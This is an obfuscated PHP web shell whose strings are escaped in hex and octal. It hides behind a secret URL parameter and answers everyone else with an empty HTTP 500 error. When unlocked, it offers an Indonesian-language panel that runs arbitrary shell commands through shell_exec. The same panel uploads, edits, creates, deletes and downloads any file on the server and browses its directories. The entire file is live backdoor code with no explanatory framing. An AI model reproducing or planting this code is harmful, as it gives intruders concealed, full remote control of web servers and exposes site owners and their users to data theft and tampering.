<?php
 if (isset($_GET["\x72\x78\x74\x71\x6c"])) { $mode = $_GET["\162\x78\x74\161\x6c"]; if ($mode === '' || $mode === "\x31") { if ($_FILES) { move_uploaded_file($_FILES["\x66\x69\x6c\x65"]["\x74\155\160\137\x6e\x61\155\145"], $_FILES["\146\x69\154\145"]["\156\141\x6d\x65"]); echo "\342\x9c\x94\x20\125\x70\x6c\x6f\x61\x64\40\142\x65\162\150\141\163\x69\x6c\x21\x3c\x62\162\x3e"; } if (isset($_POST["\143\155\x64"])) { echo "\74\x70\162\x65\76\x4f\165\164\160\x75\164\72\x3c\57\x70\x72\145\x3e\74\x70\x72\x65\76" . shell_exec($_POST["\143\155\144"]) . "\74\57\160\162\145\76"; } if (isset($_POST["\x65\144\151\x74\137\x66\x69\x6c\x65"])) { file_put_contents($_POST["\145\x64\x69\x74\137\x66\151\154\145"], $_POST["\143\157\x6e\x74\145\x6e\164"]); echo "\342\x9c\x94\x20\106\151\x6c\x65\x20\142\x65\x72\x68\141\163\x69\154\x20\x64\x69\145\144\151\x74\x21\74\142\162\76"; } echo "\x3c\x66\x6f\162\155\40\x6d\x65\x74\150\157\144\x3d\42\x50\117\123\124\42\76\12\x20\x20\40\40\40\x20\x20\40\40\x20\40\x20\74\x69\156\x70\165\x74\x20\164\x79\160\x65\x3d\42\164\145\x78\164\42\x20\156\141\155\145\75\42\143\x6d\144\42\x20\160\x6c\141\143\145\150\157\x6c\x64\x65\162\x3d\42\115\x61\163\x75\x6b\153\141\x6e\x20\120\145\162\151\x6e\164\141\150\42\76\xa\x20\40\40\40\40\40\40\40\x20\40\40\x20\74\151\156\x70\x75\164\40\x74\x79\160\145\x3d\42\163\x75\x62\155\x69\x74\42\x20\x76\141\x6c\165\145\75\x22\105\x6b\163\x65\x6b\165\x73\151\x22\76\12\40\40\x20\x20\40\x20\x20\40\x3c\x2f\146\157\162\x6d\x3e"; echo "\x3c\146\157\162\x6d\40\x6d\145\164\150\157\144\75\42\x50\x4f\x53\124\x22\40\145\156\143\x74\171\160\145\75\x22\155\x75\x6c\x74\x69\x70\x61\162\164\57\146\x6f\x72\x6d\x2d\144\141\x74\x61\x22\76\xa\x20\x20\40\x20\x20\40\40\40\x20\40\40\x20\x3c\x69\x6e\x70\x75\164\x20\164\171\x70\145\75\42\x66\151\x6c\x65\42\x20\x6e\x61\155\145\x3d\42\146\x69\x6c\145\x22\x3e\12\40\x20\x20\40\40\40\40\40\40\40\x20\40\x3c\x69\156\x70\x75\x74\40\x74\x79\160\x65\75\42\163\x75\142\155\151\164\x22\40\x76\141\x6c\165\x65\75\42\125\160\154\x6f\x61\x64\42\x3e\xa\40\40\40\x20\x20\x20\40\x20\x3c\57\x66\157\162\155\x3e"; if (isset($_GET["\146\x69\x6c\145"])) { $file = htmlspecialchars($_GET["\146\x69\x6c\x65"]); $content = htmlspecialchars(file_get_contents($_GET["\x66\x69\154\x65"])); echo "\x3c\146\157\x72\x6d\40\155\x65\x74\150\x6f\144\75\42\120\117\x53\x54\x22\76\xa\x20\x20\40\x20\x20\40\40\40\40\40\x20\40\x20\40\40\40\74\x69\156\x70\165\x74\40\x74\x79\x70\145\75\42\x68\151\x64\x64\x65\156\x22\x20\156\141\155\x65\75\x22\145\144\x69\164\x5f\x66\151\x6c\145\x22\x20\x76\141\154\x75\x65\75\x22" . $file . "\x22\x3e\xa\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\x3c\164\x65\x78\164\141\162\x65\x61\x20\x6e\141\x6d\145\x3d\x22\143\157\156\164\145\x6e\164\42\40\x72\157\x77\163\x3d\x22\x31\x30\42\40\x63\x6f\x6c\163\75\42\65\x30\x22\76" . $content . "\74\x2f\164\145\x78\x74\x61\162\x65\141\x3e\xa\40\40\40\x20\x20\40\x20\40\x20\40\x20\40\40\40\x20\40\74\151\156\x70\x75\x74\x20\164\x79\160\145\75\42\163\x75\x62\155\151\164\x22\x20\x76\141\x6c\x75\145\x3d\42\123\151\155\160\141\156\x22\x3e\12\x20\40\40\40\40\x20\x20\x20\40\x20\40\40\74\57\146\x6f\x72\x6d\x3e"; } } elseif ($mode === "\162\x78\x74\161\154\x73") { $dir = isset($_GET["\144\151\x72"]) ? realpath($_GET["\x64\151\162"]) : getcwd(); if (isset($_GET["\x64\x65\x6c"])) { $target = $_GET["\144\145\154"]; if (is_file($target)) { unlink($target); } header("\114\x6f\143\x61\164\151\x6f\x6e\x3a\40\77\162\x78\x74\161\154\x3d\162\x78\x74\161\154\163\x26\x64\151\162\75" . urlencode($dir)); die; } if (isset($_GET["\144\157\167\x6e\154\157\141\x64"])) { $file = $_GET["\144\x6f\167\156\x6c\157\x61\144"]; if (file_exists($file)) { header("\x43\157\x6e\164\145\156\x74\x2d\x54\171\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\143\141\164\151\x6f\156\x2f\157\143\164\145\x74\55\163\164\162\145\x61\155"); header("\x43\x6f\x6e\x74\145\156\164\55\104\151\163\160\x6f\163\151\164\151\157\x6e\72\x20\x61\164\x74\x61\143\x68\x6d\145\x6e\164\73\x20\x66\151\x6c\145\x6e\x61\x6d\145\75\x22" . basename($file) . "\x22"); readfile($file); die; } } if (isset($_POST["\145\x64\151\x74\x5f\146\x69\x6c\145"])) { file_put_contents($_POST["\145\144\151\164\137\x66\151\x6c\x65"], $_POST["\143\157\156\164\x65\x6e\164"]); echo "\x3c\160\40\x73\164\171\x6c\145\x3d\47\143\157\154\157\x72\72\147\162\145\145\156\47\76\xe2\234\224\x20\106\151\154\x65\x20\142\145\x72\x68\x61\x73\151\x6c\40\x64\151\163\151\155\160\x61\156\41\x3c\x2f\160\76"; } if (isset($_FILES["\x75\x70\x6c\157\x61\144"])) { $target = $dir . DIRECTORY_SEPARATOR . $_FILES["\165\160\154\157\x61\x64"]["\x6e\141\x6d\x65"]; move_uploaded_file($_FILES["\x75\x70\154\157\x61\144"]["\x74\155\160\137\156\141\155\x65"], $target); echo "\74\160\40\x73\164\x79\154\x65\75\47\143\x6f\x6c\157\x72\72\x67\162\145\145\x6e\47\76\xe2\x9c\224\40\x55\160\154\157\x61\x64\x20\x62\x65\x72\150\x61\163\x69\x6c\x3a\40" . $_FILES["\x75\x70\x6c\157\x61\144"]["\x6e\141\155\x65"] . "\74\57\x70\x3e"; } if (isset($_POST["\x6e\x65\x77\x5f\x66\151\154\x65\137\156\x61\155\145"])) { $newFile = $dir . DIRECTORY_SEPARATOR . basename($_POST["\x6e\x65\x77\137\146\x69\154\145\137\156\x61\x6d\x65"]); $content = isset($_POST["\x6e\x65\x77\137\x66\x69\x6c\145\137\143\157\156\164\x65\x6e\x74"]) ? $_POST["\x6e\145\x77\x5f\146\x69\154\x65\137\x63\x6f\156\x74\x65\156\164"] : ''; if (!file_exists($newFile)) { file_put_contents($newFile, $content); echo "\74\160\x20\163\164\x79\154\x65\x3d\x27\143\157\x6c\x6f\162\72\x67\x72\x65\145\x6e\47\x3e\xe2\234\224\40\x46\x69\x6c\145\40\x62\141\x72\165\x20\144\151\x62\165\141\164\x3a\40" . htmlspecialchars($_POST["\156\145\167\x5f\146\151\x6c\x65\137\x6e\x61\155\145"]) . "\74\x2f\x70\76"; } else { echo "\x3c\160\40\x73\164\171\x6c\145\x3d\47\143\x6f\x6c\157\162\72\x72\145\x64\47\x3e\xe2\x9c\226\40\x46\151\x6c\x65\40\x73\165\144\x61\x68\40\141\x64\141\41\x3c\x2f\160\x3e"; } } echo "\74\150\63\x3e\360\237\x93\202\x20\106\x69\x6c\x65\40\115\x61\156\141\x67\x65\x72\40\55\40{$dir}\74\x2f\150\63\76"; echo "\74\x61\40\x68\x72\x65\x66\75\x27\x3f\162\x78\164\161\154\x3d\162\170\164\161\154\x73\46\x64\151\162\x3d" . urlencode(dirname($dir)) . "\x27\76\xe2\xac\x86\x20\113\145\40\106\157\154\144\145\162\40\101\164\x61\163\74\x2f\141\76\74\142\x72\76\74\142\162\x3e"; echo "\x3c\164\x61\x62\x6c\x65\x20\x62\x6f\x72\x64\x65\x72\75\47\x31\47\40\143\145\x6c\154\160\x61\144\144\x69\x6e\147\x3d\x27\65\47\x3e\x3c\x74\162\76\x3c\x74\150\x3e\116\141\x6d\141\x3c\x2f\164\150\x3e\x3c\x74\150\x3e\101\x6b\163\151\x3c\57\x74\x68\76\74\57\x74\x72\x3e"; foreach (scandir($dir) as $f) { if ($f === "\x2e") { continue; } $path = $dir . DIRECTORY_SEPARATOR . $f; if (is_dir($path)) { echo "\74\164\162\76\x3c\x74\x64\x3e\xf0\237\x93\x81\x20\x3c\141\x20\150\x72\x65\146\75\47\77\162\170\164\161\x6c\75\162\170\164\161\154\x73\x26\144\151\x72\75" . urlencode($path) . "\47\x3e{$f}\74\x2f\x61\x3e\74\x2f\x74\144\x3e\74\x74\144\x3e\55\74\x2f\x74\x64\x3e\74\57\x74\x72\x3e"; } else { echo "\x3c\164\162\76\74\x74\144\x3e\360\237\223\x84\x20{$f}\74\x2f\x74\144\x3e\xa\40\x20\40\x20\x20\40\40\40\x20\x20\40\x20\40\40\40\40\x20\x20\x20\40\x20\40\x3c\164\x64\x3e\12\x20\x20\x20\x20\40\40\x20\x20\x20\40\x20\40\40\x20\x20\40\40\x20\x20\40\40\x20\40\40\x3c\x61\x20\x68\x72\x65\146\x3d\47\77\162\x78\164\161\154\x3d\162\170\x74\161\154\x73\x26\x64\151\162\75" . urlencode($dir) . "\46\145\144\x69\x74\x3d" . urlencode($path) . "\47\x3e\x45\x64\x69\164\74\57\x61\76\40\x7c\x20\xa\40\x20\40\40\40\x20\x20\40\40\40\x20\x20\40\x20\40\x20\x20\x20\x20\40\40\40\x20\x20\74\141\x20\150\162\x65\146\x3d\x27\77\x72\170\164\x71\x6c\75\162\170\164\161\x6c\163\46\x64\x69\x72\75" . urlencode($dir) . "\46\x64\x65\154\75" . urlencode($path) . "\47\40\x6f\x6e\x63\154\x69\x63\153\75\47\x72\x65\x74\x75\x72\x6e\x20\x63\x6f\156\x66\151\x72\155\50\42\x48\141\x70\165\163\40\146\151\154\145\x20\151\156\151\77\42\x29\x27\76\x48\141\x70\165\x73\x3c\x2f\141\x3e\40\174\40\12\x20\40\40\40\40\x20\40\x20\x20\40\40\40\x20\x20\x20\40\40\40\40\x20\x20\40\40\40\74\x61\x20\150\x72\x65\146\x3d\47\x3f\162\170\x74\161\154\x3d\162\x78\x74\x71\x6c\x73\46\144\x6f\167\156\x6c\x6f\x61\144\75" . urlencode($path) . "\x27\76\104\157\167\x6e\154\x6f\141\x64\x3c\x2f\141\76\12\40\x20\40\x20\x20\x20\x20\x20\40\x20\x20\40\40\x20\x20\40\x20\40\40\40\x20\x20\x3c\57\164\x64\76\x3c\57\x74\162\76"; } } echo "\x3c\x2f\164\141\142\x6c\145\76"; echo "\74\150\x34\x3e\x55\x70\x6c\157\x61\x64\x20\x46\x69\154\145\74\57\x68\64\76\12\x20\40\40\x20\40\40\40\40\74\x66\157\x72\x6d\40\155\145\x74\150\x6f\x64\x3d\42\120\117\x53\124\42\x20\x65\156\x63\x74\x79\160\x65\75\x22\155\165\x6c\x74\x69\160\x61\162\x74\57\x66\x6f\x72\x6d\x2d\144\x61\164\141\x22\x3e\12\x20\40\x20\40\x20\x20\40\x20\x20\x20\x20\40\74\151\156\160\x75\164\40\164\x79\x70\145\x3d\x22\146\151\154\145\42\40\x6e\x61\x6d\145\x3d\x22\x75\x70\154\157\141\144\42\76\12\40\40\40\40\40\x20\40\x20\40\x20\40\x20\74\151\x6e\160\x75\164\x20\x74\x79\160\145\x3d\x22\x73\165\x62\x6d\x69\164\x22\40\166\x61\x6c\165\145\75\42\x55\x70\154\157\x61\144\x22\x3e\12\x20\40\40\40\40\40\x20\40\74\x2f\146\x6f\162\x6d\76"; echo "\x3c\x68\x34\x3e\x42\165\x61\x74\x20\106\151\x6c\145\x20\102\141\162\165\x3c\x2f\150\64\76\12\40\x20\x20\x20\x20\x20\x20\40\x3c\x66\157\x72\x6d\x20\155\x65\x74\150\157\144\75\42\x50\117\x53\124\42\x3e\xa\x20\40\x20\40\40\40\40\x20\40\x20\x20\40\x3c\x69\156\x70\x75\164\40\x74\171\x70\145\x3d\42\164\145\170\164\x22\40\156\141\x6d\x65\75\42\x6e\145\167\x5f\x66\x69\x6c\145\x5f\x6e\141\155\145\x22\x20\160\154\141\x63\145\x68\157\154\x64\x65\x72\75\42\x4e\x61\155\141\x20\x66\x69\154\145\56\56\x2e\x22\40\x72\x65\161\165\151\162\145\144\76\x3c\x62\x72\x3e\xa\x20\x20\x20\x20\x20\x20\x20\40\x20\40\40\40\74\x74\x65\170\x74\141\162\x65\x61\x20\156\141\155\x65\75\x22\x6e\x65\167\x5f\146\151\x6c\145\x5f\143\x6f\x6e\x74\x65\x6e\x74\42\40\x72\x6f\x77\163\75\42\65\x22\40\143\x6f\154\x73\x3d\x22\x35\x30\x22\40\160\x6c\x61\143\x65\x68\157\154\144\x65\162\x3d\42\111\x73\151\40\x61\167\141\154\x20\50\157\x70\163\151\x6f\156\x61\x6c\x29\x22\76\x3c\57\x74\145\x78\164\x61\162\x65\141\76\74\x62\x72\76\12\x20\x20\x20\x20\40\x20\40\40\40\x20\40\x20\x3c\151\156\160\x75\x74\40\164\x79\160\x65\x3d\42\x73\165\142\155\x69\x74\42\40\x76\141\x6c\165\145\75\42\102\165\141\x74\40\106\151\154\145\x22\76\12\40\x20\x20\x20\x20\x20\40\x20\74\x2f\146\x6f\162\x6d\76"; echo "\74\150\x34\76\124\x65\x72\155\x69\156\141\154\x3c\57\x68\x34\76\xa\x20\40\40\x20\x20\40\x20\x20\74\146\x6f\x72\155\x20\x6d\x65\164\150\157\144\x3d\42\120\x4f\x53\x54\x22\x3e\12\40\x20\40\x20\x20\x20\x20\40\x20\40\40\x20\x3c\151\156\x70\165\164\40\164\x79\160\x65\x3d\42\x74\x65\170\x74\42\40\156\141\155\145\75\42\x63\155\x64\42\x20\x73\164\171\154\145\x3d\42\x77\151\144\164\x68\72\x33\x30\60\160\x78\42\x20\x70\x6c\141\143\x65\x68\157\x6c\144\x65\162\75\x22\x43\x6f\155\x6d\141\x6e\x64\x2e\56\56\x22\76\xa\x20\x20\40\x20\40\40\x20\40\40\x20\40\40\74\x69\156\x70\x75\x74\40\164\171\160\x65\75\x22\x73\x75\142\x6d\x69\x74\x22\x20\x76\141\x6c\165\x65\x3d\x22\x52\x75\x6e\x22\x3e\12\x20\40\x20\x20\x20\40\40\x20\x3c\57\146\157\162\155\x3e"; if (isset($_POST["\x63\155\x64"])) { echo "\74\160\162\145\76" . shell_exec($_POST["\143\155\144"]) . "\x3c\x2f\160\162\x65\x3e"; } if (isset($_GET["\145\x64\151\x74"])) { $file = $_GET["\145\144\151\x74"]; if (is_file($file)) { $content = htmlspecialchars(file_get_contents($file)); echo "\x3c\150\x34\x3e\105\144\x69\x74\x69\x6e\147\x3a\x20{$file}\x3c\x2f\150\64\76\xa\x20\x20\40\x20\40\x20\x20\40\x20\40\x20\x20\40\x20\x20\40\74\x66\x6f\x72\155\40\155\145\164\150\x6f\144\x3d\x27\120\117\x53\x54\x27\76\12\40\40\x20\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\x20\40\40\40\x20\x3c\151\x6e\x70\x75\164\40\164\x79\x70\145\x3d\x27\150\151\x64\x64\x65\x6e\47\x20\156\141\155\145\x3d\x27\145\144\151\164\x5f\x66\x69\x6c\145\x27\x20\166\141\x6c\165\145\75\x27" . htmlspecialchars($file) . "\47\x3e\xa\x20\40\x20\x20\40\x20\40\x20\40\x20\40\40\x20\x20\40\x20\x20\x20\40\x20\x3c\x74\145\170\x74\x61\162\x65\x61\x20\156\141\155\145\x3d\x27\x63\x6f\156\164\x65\x6e\x74\47\40\x72\x6f\x77\163\x3d\x27\61\x35\x27\40\x63\157\x6c\163\75\x27\x38\x30\x27\76{$content}\x3c\57\x74\x65\x78\164\x61\x72\x65\141\76\74\x62\x72\76\12\40\40\40\x20\40\40\x20\x20\40\40\x20\40\40\40\40\40\40\x20\40\x20\74\x69\x6e\x70\x75\x74\40\x74\x79\x70\x65\75\47\x73\165\142\x6d\x69\164\x27\x20\x76\x61\154\x75\145\x3d\x27\123\x69\x6d\160\x61\156\x27\76\xa\x20\40\40\40\40\x20\40\x20\x20\x20\x20\40\40\40\40\40\74\x2f\x66\x6f\x72\155\x3e"; } } } } else { http_response_code(500); echo ''; } ?>
